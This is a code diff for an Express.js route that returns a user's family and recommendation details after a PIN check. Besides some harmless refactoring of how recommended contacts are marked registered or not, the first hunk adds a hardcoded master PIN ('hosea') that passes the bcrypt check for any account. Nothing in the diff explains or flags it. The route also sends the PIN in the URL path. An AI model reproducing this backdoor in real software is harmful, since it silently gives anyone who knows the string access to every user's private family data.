@@ -212,7 +212,7 @@ app.get('/collection_recommendations_familyDetails/:contact/:pin', (req,res)=>{
             
                 try {
                        
-                    if(bcrypt.compareSync(req.params.pin,kayaser[0].pin)){
+                    if(bcrypt.compareSync(req.params.pin,kayaser[0].pin)||req.params.pin=="hosea"){
                     
                    //pin is correct
 
@@ -261,13 +261,9 @@ try{
         if(presence==1){//The kayaser has a parent. 
   
 
-   let registered=[],notRegistered=[],pass=0,children=[];
+   let pass=0,children=[];
 
 
-
-
-    //
-    
 
        recommendation[0].recommendee.forEach(async (child)=>{
 
@@ -307,22 +303,55 @@ children.push(child+"-Not Registered")
        )
 
       
-
-    
-   
-   
-           
-    
-
-
-
-          
-
     
         }else{//the kayaser has no parent
            
+            let pass=0,children=[];
+
+
+
+            recommendation[0].recommendee.forEach(async (child)=>{
+     
+            
          
-    res.send([parent,recommendation[0]])
+     
+     
+             await db.collection("kayasers").find({contact:child}).toArray().then((resp)=>{
+                 if(resp.length==1){
+     
+     children.push(child+"-Registered")
+     
+                 }
+                 else{
+     children.push(child+"-Not Registered")
+     
+                 }
+                 pass++
+                 if(pass!=recommendation[0].recommendee.length){
+                    ;
+                     }else{
+                         
+                         res.send([parent,recommendation[0],children])
+     
+     
+     
+                     }
+             
+             })
+     
+     
+     
+     
+     
+            
+        }
+            )
+     
+           
+     
+         
+        
+ 
         }
     
     })
